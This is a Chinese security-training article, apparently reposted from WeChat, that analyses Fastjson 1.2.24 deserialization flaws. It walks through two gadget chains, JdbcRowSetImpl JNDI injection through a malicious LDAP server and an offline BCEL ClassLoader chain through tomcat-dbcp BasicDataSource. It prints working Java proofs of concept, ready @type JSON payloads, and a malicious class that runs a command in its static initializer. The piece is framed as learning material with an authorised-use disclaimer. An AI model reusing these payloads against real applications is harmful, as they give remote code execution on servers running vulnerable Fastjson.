<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QUCDu9wAXgjpdUbizY2bcA)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本文由掌控安全学院 - xilitter 投稿

0x01 利用条件
---------

通过对 fastjson 基础知识的学习和反序列化流程的分析，发现它与我们之前学的常规的反序列化又不太一样。fastjson 自己定义了一套反序列化规则，它不需要反序列化的类去继承 Serializable 接口，也不需要找 readObject 函数作为入口。相反，它是将类中的 setter 和满足特定条件的 getter 方法作为出发点，@type 所指向的全类名必须能够找到就可以反序列化成功。总的来说，从原生反序列化中的属性可控到寻找 setter 或者 getter 方法可控。（ps：这点很重要）

本篇文章主要学习两种利用方法，出网和不出网。

0x02 出网 + JNDI 注入
-----------------

### 利用类：JdbcRowSetImpl

该类有一块 JNDI 注入的代码逻辑：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vthWs14HecOOI9icqgd7X5BvZyUl4KocGS0PPF3WsKBgJblYMKppbqFQ/640?wx_fmt=png&from=appmsg)

代码是反编译出来的，但是不影响。conn 属性默认为空，不用管自然会走到 else if。getDataSourceName 是 getter 方法，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vO8NG2qkd8TlXs62QBPdav5A3WPsen2HGpiazibnBSjpaib2ibVB77hwgpA/640?wx_fmt=png&from=appmsg)

它的返回值我们可控，就可以实现 JNDI 注入。那么接下来就是寻找哪个 getter 或者 setter 方法调用了 connect 方法，查找用法全局搜索，在本类中是有两处。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vKicNrFNmoCl1KiasdNz36icmCxxSMPj3YXVMDk16q2CSlIiawrLEhia4Jhg/640?wx_fmt=png&from=appmsg)

我们用 setAutoCommit 方法，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vuomQDRsMYwtvUOw2nibe2aNS0SoYoax4aD0tKozsPc01CDFJN7SY3kw/640?wx_fmt=png&from=appmsg)

接收一个布尔型的参数，conn 默认为空，自然会调用到 connect 方法。那可不可以用前面的 getter 方法，Fastjson 基础篇讲到 parse 方法里会执行返回值类型为 Map 等特定的 getter 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vxuHn890vc5leISgRz7TV3FdW78mTOfCyiapEotB8W4ibR0SibYl306OSQ/640?wx_fmt=png&from=appmsg)

而它的返回值只是一个普通的接口，不满足条件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vfTvjFEweFX5lhjNZFDD7uWwMlcpHQDywibdsM9v5a7Aibw71vcZaXQDg/640?wx_fmt=png&from=appmsg)

但是在下面的 toJSON 会遍历执行所有的 getter（基础篇没有写，文章最后会分析一下），前提是上面的代码不会出错，自己可以调一下，是会出错的。到此整个利用流程结束，将 setAutoCommit 作为入口，getDataSourceName 作为输入实现 JNDI 注入。

使用工具 Yakit 起一个恶意的 ldap 服务，里面放着恶意类，很方便。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vpSQbe8ZCz3OwPl7kd6icInxVn4Ev3YUG9P00xn9b5tEvAY6aEbbxfMA/640?wx_fmt=png&from=appmsg)

最终 POC

```
package fastjson.test2;
import com.alibaba.fastjson.JSON;
public class JdbcRowSetImplPOC {
    public static void main(String[] args){
        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8086/LrcaDhze\",\"autoCommit\":\"false\"}";
        JSON.parseObject(s);
    }

```

很简单，也不需要去过多的分析。感兴趣也可以自己调试一下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vqvE13cI2MmZlz0ribaqfu4NpoFXcuwOOibqjYEZ9mLw9BLEQNJ4teKiaQ/640?wx_fmt=png&from=appmsg)

0x03 不出网 + 动态加载字节码
------------------

JNDI 注入实现的是远程类加载，这种利用方法主要实现本地类加载。需要相关 tomcat 的依赖

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vL0o3IFfar4Ph7u9Sib3Cnjk8zdXibZtiadP7Dcc5rL3ozoKuKmUBvLd1w/640?wx_fmt=png&from=appmsg)

### 利用类：ClassLoader

需要注意的是，它不是 java.lang 下的类加载器，它是继承于原生的 ClassLoader，在包 com.sun.org.apache.bcel.internal.util 下。

利用方法 loadClass，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5v4Uq2wx29trjvIZ70xlaiauW81TeqkburSlDUk7tyIKZqaCVXjy6ZuibQ/640?wx_fmt=png&from=appmsg)

defineClass 最终实现类加载。class_name 是传进来的参数，我们需要让它走到第一个 if 分支里，不然是会抛出异常的，跟进到 createClass 方法，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vy8GS9jkWFyfhpRqHgnXTXU9mSOQvCjpnmA3AX381aMPB3NV9cQ03tw/640?wx_fmt=png&from=appmsg)

看逻辑，我们传进去的串前面必须满足

```
$$BCEL$$
```

八个字符，进入到这个函数后会对第八个字符后面的串解码并返回，所以我们只需要将字节码编码，前面加上

```
$$BCEL$$
```

标记符就好了。

接下来就是如何调用到这个 loadClass 方法了。这就需要前面说的 tomcat 依赖里的类了：BasicDataSource。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5v6ML2lp7VxjqIW3pZof3UpmdibZuXvM7QgDymwKngqQDJUMM0U9iaVIJw/640?wx_fmt=png&from=appmsg)

在 createConnectionFactory 方法里，利用的地方是第二个 Class.forName，用于通过类的全限定名来加载和获取对应的 Class 对象，该方法像图中所说，有三个参数。

```
参数一：类的全限定名，用于获取它的Class对象。
参数二：布尔型，为true时，在类加载的时候会进行初始化。
参数三：选择指定的类加载器。

```

能够指定任意的类加载器，那就与开头的 loadClass 方法对接上了，代码中第二个参数为 true，会进行初始化。动态类加载的两个条件满足，能够执行恶意代码。

现在需要的是 driverClassName 和 driverClassLoader 属性是否可控，可控的前提是是否存在对应的 getter 和 setter 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vb8bIEzsgibnDWkHHNFmUOlicOfRibu0X2mpAPShGTAISNSV4abUXBoXQw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5v8sS9oPCC90Ir4FcYrtPAtWVtKicclzzA49uMGHGNJ0BIeU6worWWNaA/640?wx_fmt=png&from=appmsg)

查找用法很容易就能找到，（也有对应的 setter，没放截图而已）那么接下来就是要找哪个 getter 或者 setter 方法调用了 createConnectionFactory，这里找两层就能找得到了。

```
createConnectionFactory-》createDataSource-》getConnection
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vteia4MPrZO8MPbwgibdG3cUaqvW6vg5P2H2A5ibzrBeNsNN3V4RG2lq8A/640?wx_fmt=png&from=appmsg)

到此整个流程分析结束。恶意类代码：

```
package fastjson.test2;
import java.io.IOException;
public class Evaltest {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

```

包名应该得一样，之前用不一样包名的字节码文件弹不出计算器。可以写一个普通的代码逻辑。

```
package fastjson.test2;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.SQLException;
public class FastJsonBcel {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Evaltest.class"));
        String s = Utility.encode(bytes,true);
        BasicDataSource basicDataSource = new BasicDataSource();
        basicDataSource.setDriverClassLoader(classLoader);
        basicDataSource.setDriverClassName("$$BCEL$$"+s);
        basicDataSource.getConnection();
    }
}

```

要控制的属性也就两个，一个是要加载的字节码，另一个是类加载器。代码逻辑前面都说过了，很容易能看懂了。运行也是可以弹出计算器，最后写一个最终的 fastjson 反序列化的 payload：

```
package fastjson.test2;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.SQLException;
public class FastJsonBcel {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\Evaltest.class"));
        String s = Utility.encode(bytes,true);
        String code = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"DriverClassName\":\"$$BCEL$$"+s+"\",\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\}\}";
        JSON.parseObject(code);

```

成功弹出计算器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vnltibzJiamEAGk6Cib0QOVAEiaB1Plib8dRblI8D2xnQ6qn4cL3UOlLGiaIQ/640?wx_fmt=png&from=appmsg)

0x04 toJSON 方法遍历所有 getter 的分析
-----------------------------

算是补的基础的坑，但是不会说太细，知道就好。

下断点调试吧，以第二个利用代码作为例子。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vs9Eev8zqq7pxFv4lH0cG0DoQS1UWicgxD9ibsyicrE2ic5tI2q40Aqv4LQ/640?wx_fmt=png&from=appmsg)

对 BasicDataSource 类所继承的类的做个判断，这里都不是，直接跳过。又开始判断 BasicDataSource 对象的类型了。这里也都不是，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vYZzibjib06pOe5PeAmsWPrq7zkkqrMM8Nl5uM7DlM9l0dk3tYKcxaX7w/640?wx_fmt=png&from=appmsg)

跟进到 getFieldValuesMap 方法里面。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vI5zjRo6LEc7b2aUdrjVR0vTPqSSje7ibZ839sFKSrqqPfGzEdzuhNgQ/640?wx_fmt=png&from=appmsg)

遍历所有的 getter 方法，然后将它们对应的字段的值储存在 Map 中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5vyhbJ8BK7XzSuLuZf8VoOn6KtZ6ov2ZnmCw8CWbH0kibya3VxPia1y8sQ/640?wx_fmt=png&from=appmsg)

当遍历到 getConnection 方法时，跟进 getPropertyValue 方法，继续跟进到 get 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcps03ZJicWoUksbE1sU1Ll5v3M0kDt0MOcr70FRbN2vMdqfAzWz4SnfEL1XkDvAHlFrEep48MkRFIQ/640?wx_fmt=png&from=appmsg)

动态调用函数，成功调用 getConnection 方法，作为反序列化的开头，继续跟进的话也就回到刚才利用分析的地方。到此就结束。

0x05 结语
-------

Fastjson 的 1.2.24 版本是最先发现漏洞的版本，这篇文章也是作为学习 Fastjson 反序列化的开端。后续会继续学习 Fastjson 高版本的绕过。

反序列化之路任重而道远。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 靶场账号**哦

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力